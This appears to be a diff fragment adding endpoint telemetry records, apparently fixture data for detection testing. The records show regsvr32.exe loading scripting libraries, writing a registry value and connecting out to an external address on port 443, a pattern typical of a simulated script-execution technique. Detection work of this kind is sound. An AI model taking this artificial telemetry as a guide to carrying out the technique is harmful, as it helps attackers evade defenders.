+{ "event_type": "image_load", "image_name": "wshom.ocx", "image_path": "C:\\Windows\\System32\\wshom.ocx", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475", "registry_value": "418A073AA3BC3475", "timestamp": 131883573241200016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "scrrun.dll", "image_path": "C:\\Windows\\System32\\scrrun.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "MpClient.dll", "image_path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1810.5-0\\MpClient.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240580000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "process", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "subtype": "terminate", "timestamp": 131883573241369984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "destination_address": "151.101.48.133", "destination_port": "443", "event_type": "network", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "protocol": "tcp", "source_address": "192.168.162.134", "source_port": "50505", "subtype": "outgoing", "timestamp": 131883573238680000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}", "user": "ART-DESKTOP\\bob", "user_domain": "ART-DESKTOP", "user_name": "bob" }
